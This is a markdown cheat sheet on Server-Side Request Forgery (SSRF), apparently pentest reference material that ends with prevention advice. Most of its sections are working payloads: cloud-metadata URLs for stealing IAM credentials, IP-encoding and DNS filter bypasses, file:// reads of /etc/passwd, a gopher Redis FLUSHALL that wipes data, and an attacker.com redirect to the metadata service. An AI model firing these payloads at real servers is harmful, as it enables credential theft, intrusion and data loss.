# Server-Side Request Forgery (SSRF)

## What is SSRF?

SSRF tricks the server into making HTTP requests on behalf of the attacker. Instead of the attacker's browser sending a request, the server does — giving access to internal services, cloud metadata, and backend systems that are otherwise unreachable.

---

## How It Works

```
Attacker → [Vulnerable Server] → Internal Service / Cloud Metadata / Localhost
```

The vulnerability exists when user-controlled input is used as a URL in a server-side request (e.g., image fetcher, webhook, PDF generator, URL preview).

---

## Common Entry Points

- Image/file fetch by URL
- Webhooks
- PDF/screenshot generators
- URL preview features
- Import from URL (e.g., import CSV from link)
- XML parsers (XXE can lead to SSRF)

---

## Basic Payloads

```
# Localhost access
http://localhost/admin
http://127.0.0.1/admin
http://0.0.0.0/admin

# Internal network
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1

# Cloud metadata (AWS)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Cloud metadata (GCP)
http://metadata.google.internal/computeMetadata/v1/

# Cloud metadata (Azure)
http://169.254.169.254/metadata/instance?api-version=2021-01-01
```

---

## AWS Metadata Exploitation

```bash
# Get IAM credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# Response gives: AccessKeyId, SecretAccessKey, Token
# Use these with AWS CLI to access services
```

---

## Bypassing SSRF Filters

### IP Encoding Tricks
```
# Decimal
http://2130706433/          # = 127.0.0.1
# Octal
http://0177.0.0.1/
# Hex
http://0x7f.0x0.0x0.0x1/
# IPv6
http://[::1]/
# Short form
http://127.1/
```

### DNS Tricks
```
# Use a domain that resolves to 127.0.0.1
http://localtest.me/
http://spoofed.burpcollaborator.net/

# DNS Rebinding — domain resolves to allowed IP first, then switches to internal IP
```

### URL Scheme Tricks
```
dict://localhost:11211/
file:///etc/passwd
gopher://localhost:6379/_INFO   # Redis
ftp://internal-host/
```

### Redirect Bypass
If the server follows redirects, host your own redirect:
```
http://attacker.com/redirect → 302 → http://169.254.169.254/
```

### Open Redirect Chain
```
http://trusted-site.com/redirect?url=http://169.254.169.254/
```

---

## Protocol Smuggling with Gopher

Gopher lets you craft raw TCP payloads — useful for hitting internal services:

```
# Hit internal Redis
gopher://127.0.0.1:6379/_FLUSHALL

# Hit internal HTTP server
gopher://127.0.0.1:80/_GET / HTTP/1.1%0d%0aHost: localhost%0d%0a%0d%0a
```

---

## Blind SSRF

When there's no response body, detect via:
- Out-of-band DNS/HTTP using Burp Collaborator or interactsh
- Timing differences (internal host responds slower/faster)

```
http://your-collaborator-url.burpcollaborator.net/
```

---

## Impact

- Access internal admin panels
- Read cloud IAM credentials → full cloud account takeover
- Port scan internal network
- Read local files via `file://`
- Interact with internal services (Redis, Memcached, Elasticsearch)
- Pivot to RCE in some cases

---

## Prevention

- **Allowlist** valid domains/IPs for outbound requests
- **Block private IP ranges** (10.x, 172.16.x, 192.168.x, 127.x, 169.254.x)
- **Resolve and validate DNS** before making request (watch for TOCTOU)
- **Disable unnecessary URL schemes** (file://, gopher://, dict://)
- **Don't follow redirects** blindly
- Use a dedicated egress proxy with strict allowlisting

---

## References

- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [PayloadsAllTheThings - SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [HackTricks SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
